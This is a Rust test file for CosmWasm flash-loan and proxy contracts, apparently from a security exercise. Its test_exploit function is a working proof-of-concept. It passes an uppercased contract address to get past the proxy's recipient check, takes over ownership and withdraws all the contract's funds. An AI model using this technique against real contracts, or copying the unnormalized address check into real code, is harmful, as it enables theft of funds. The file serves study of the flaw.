#[cfg(test)]
pub mod tests {
    use crate::contract::DENOM;
    use common::flash_loan::{
        ExecuteMsg as FlashLoanExecuteMsg, InstantiateMsg as FlashLoanInstantiateMsg,
    };
    use common::mock_arb::{
        ExecuteMsg as MockArbExecuteMsg, InstantiateMsg as MockArbInstantiateMsg,
    };
    use common::proxy::{ExecuteMsg, InstantiateMsg};
    use cosmwasm_std::{coin, to_binary, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};
    use cosmwasm_std::testing::MockApi;
    use cosmwasm_std::Api;

    pub fn proxy_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub fn flash_loan_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            flash_loan::contract::execute,
            flash_loan::contract::instantiate,
            flash_loan::contract::query,
        );
        Box::new(contract)
    }

    pub fn mock_arb_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            mock_arb::contract::execute,
            mock_arb::contract::instantiate,
            mock_arb::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr, Addr, Addr) {
        let mut app = App::default();

        let cw_template_id = app.store_code(proxy_contract());
        let flash_loan_id = app.store_code(flash_loan_contract());
        let mock_arb_id = app.store_code(mock_arb_contract());

        // init flash loan contract
        let msg = FlashLoanInstantiateMsg {};
        let flash_loan_contract = app
            .instantiate_contract(
                flash_loan_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "flash_loan",
                None,
            )
            .unwrap();

        // init proxy contract
        let msg = InstantiateMsg {
            flash_loan_addr: flash_loan_contract.to_string(),
        };
        let proxy_contract = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "proxy",
                None,
            )
            .unwrap();

        // init mock arb contract
        let msg = MockArbInstantiateMsg {};
        let mock_arb_contract = app
            .instantiate_contract(
                mock_arb_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "mock_arb",
                None,
            )
            .unwrap();

        // mint funds to flash loan contract
        app = mint_tokens(app, flash_loan_contract.to_string(), Uint128::new(10_000));

        // set proxy contract
        app.execute_contract(
            Addr::unchecked(ADMIN),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::SetProxyAddr {
                proxy_addr: proxy_contract.to_string(),
            },
            &[],
        )
        .unwrap();

        (app, proxy_contract, flash_loan_contract, mock_arb_contract)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
            proper_instantiate();

        // prepare arb msg
        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
            recipient: flash_loan_contract.clone(),
        })
        .unwrap();

        // cannot call flash loan address from proxy
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: flash_loan_contract.clone(),
                msg: arb_msg.clone(),
            },
            &[],
        )
        .unwrap_err();

        // try perform flash loan
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract,
            &ExecuteMsg::RequestFlashLoan {
                recipient: mock_arb_contract,
                msg: arb_msg,
            },
            &[],
        )
        .unwrap();

        // funds are sent back to flash loan contract
        let balance = app
            .wrap()
            .query_balance(flash_loan_contract.to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));
        
    }

    #[test]
    fn test_exploit(){
        /*
        @note
        •   get the non-normalized version of the flash loan contract address

        •   Pass this to proxy::request_flash_loan as recipient, bypassing check
            if recipient contract is the flash loan contract
        •   call update_owner, which works because it does not canonicalize the address before
            validating it
        
        •   Update owner to USER and then call withdraw(), which we can now call
            because we are the flash loan contract owners
        */
        let mock_api = MockApi::default();

        let (mut app, proxy_contract, flash_loan_contract, arb_contract) = proper_instantiate();
        let flash_loan_uc = Addr::unchecked(flash_loan_contract.clone().into_string().to_uppercase());

        let msg = FlashLoanExecuteMsg::TransferOwner{
            new_owner: Addr::unchecked(USER)
        };

        app.execute_contract(
            Addr::unchecked(USER),
            proxy_contract.clone(),
            &ExecuteMsg::RequestFlashLoan{
                recipient: flash_loan_uc.clone(),
                msg: to_binary(&msg).unwrap(),
            },
            &vec![]
        ).unwrap();

        //now that we are owner, withdraw funds
        app.execute_contract(
            Addr::unchecked(USER),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::WithdrawFunds{
                recipient: Addr::unchecked(USER),
            },
            &vec![],
        ).unwrap();

        let new_bal = app.wrap().query_balance(USER, DENOM).unwrap();
        println!("user balance: {:?}", &new_bal);
        assert!(new_bal.amount > Uint128::zero());
    }
}
